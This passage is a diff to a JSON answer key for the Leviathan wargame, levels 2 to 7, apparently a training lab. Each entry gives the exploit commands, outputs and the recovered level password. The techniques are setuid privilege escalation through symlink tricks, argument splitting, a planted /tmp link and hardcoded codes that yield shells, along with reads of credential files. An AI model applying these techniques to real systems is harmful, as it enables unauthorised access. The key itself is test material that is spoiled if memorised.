@@ -33,10 +33,121 @@
     "strcmp(\"tes\", \"sex\")"
    ],
    "pw": "ERJ9jTYWXE"
+  },
+  {
+   "lvl": 2,
+   "user": "leviathan2",
+   "cmds": [
+    [
+     "# printfile is setuid leviathan3; strings show '/bin/cat %s'",
+     "strings printfile | grep -E 'Usage|cat|Cant'",
+     "objdump -d -M intel printfile | sed -n '/<main>:/,/ret/p'",
+     "# access(path) runs as us, but system('cat path') splits on spaces \u2014 after setreuid",
+     "rm -rf /tmp/l2; mkdir -p /tmp/l2",
+     "ln -s /etc/leviathan_pass/leviathan3 /tmp/l2/a",
+     "touch \"/tmp/l2/a b\"",
+     "./printfile \"/tmp/l2/a b\""
+    ]
+   ],
+   "out": [
+    "cat: b: No such file or directory"
+   ],
+   "pw": "PiEpxxknZH",
+   "note": "the privileged cat prints the symlinked password file first \u2014 the b error proves the argument was split"
+  },
+  {
+   "lvl": 3,
+   "user": "leviathan3",
+   "cmds": [
+    [
+     "# level3 is setuid leviathan4; strings show 'snlp' and '/bin/sh'",
+     "strings level3 | grep -E 'snlp|bin/sh'",
+     "objdump -d -M intel level3 | sed -n '/<do_stuff>:/,/ret/p'",
+     "# the immediates spell snlprintf (with fgets' trailing newline)",
+     "./level3",
+     "# enter: snlprintf",
+     "id",
+     "cat /etc/leviathan_pass/leviathan4"
+    ]
+   ],
+   "out": [
+    "Enter the password>",
+    "[You've got shell]!",
+    "uid=12004(leviathan4) gid=12003(leviathan3)"
+   ],
+   "pw": "XIyBbRwAPt"
+  },
+  {
+   "lvl": 4,
+   "user": "leviathan4",
+   "cmds": [
+    [
+     "# .trash/bin is setuid leviathan5; it prints the password as 8-bit binary numbers",
+     "ls -la .trash",
+     "./.trash/bin",
+     "python3 -c \"print(''.join(chr(int(b,2)) for b in '01000010 01110101 ...'.split()))\""
+    ]
+   ],
+   "out": [
+    "(8-bit groups, ending 00001010)"
+   ],
+   "pw": "Bub9gZ3BGU",
+   "note": "converting each 8-bit group to ASCII reconstructs the password"
+  },
+  {
+   "lvl": 5,
+   "user": "leviathan5",
+   "cmds": [
+    [
+     "# strings show hardcoded /tmp/file.log plus fopen/fgetc/putchar/unlink",
+     "strings leviathan5 | grep -E 'tmp|fopen|unlink'",
+     "# the program opens that path with leviathan6's privileges and prints it",
+     "ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log",
+     "./leviathan5"
+    ]
+   ],
+   "out": [],
+   "pw": "JRGj9iWNOb",
+   "note": "the program prints the password file character by character, then unlinks the link"
+  },
+  {
+   "lvl": 6,
+   "user": "leviathan6",
+   "cmds": [
+    [
+     "# disassembly: atoi(argv[1]) compared against 0x1bd3 at ebp-0xc",
+     "objdump -d -M intel leviathan6 | grep -m1 '0x1bd3'",
+     "# 0x1bd3 = 7123; the binary then setreuids to leviathan7 and runs /bin/sh",
+     "echo 'cat /etc/leviathan_pass/leviathan7' | ./leviathan6 7123"
+    ]
+   ],
+   "out": [],
+   "pw": "3zrlkaPTfH",
+   "note": "passing 7123 satisfies the comparison and drops into a leviathan7 shell"
+  },
+  {
+   "lvl": 7,
+   "user": "leviathan7",
+   "cmds": [
+    [
+     "# leviathan7 is the final account",
+     "cat CONGRATULATIONS"
+    ]
+   ],
+   "out": [
+    "Well Done, you seem to have used a *nix system before, now try something more serious."
+   ],
+   "pw": "3zrlkaPTfH"
   }
  ],
  "goals": {
   "0": "Your home directory holds a hidden backup of an old bookmarks file \u2014 read it closely.",
-  "1": "A setuid 'check' program gates the next shell behind a password \u2014 watch its library calls and it will tell you the password itself."
+  "1": "A setuid 'check' program gates the next shell behind a password \u2014 watch its library calls and it will tell you the password itself.",
+  "2": "The setuid binary `printfile` (owned by leviathan3) prints a file. Read leviathan3's password.",
+  "3": "The setuid binary `level3` (owned by leviathan4) asks for a password; supply it to get leviathan4's password.",
+  "4": "There is a setuid binary in the hidden `.trash` directory; run it to get leviathan5's password.",
+  "5": "The setuid binary `leviathan5` (owned by leviathan6) reads a fixed file, `/tmp/file.log`, prints it, and deletes it. Use it to read leviathan6's password.",
+  "6": "The setuid binary `leviathan6` takes a 4-digit code and spawns a shell as leviathan7 if the code is right.",
+  "7": "Confirm the game is complete."
  }
 }
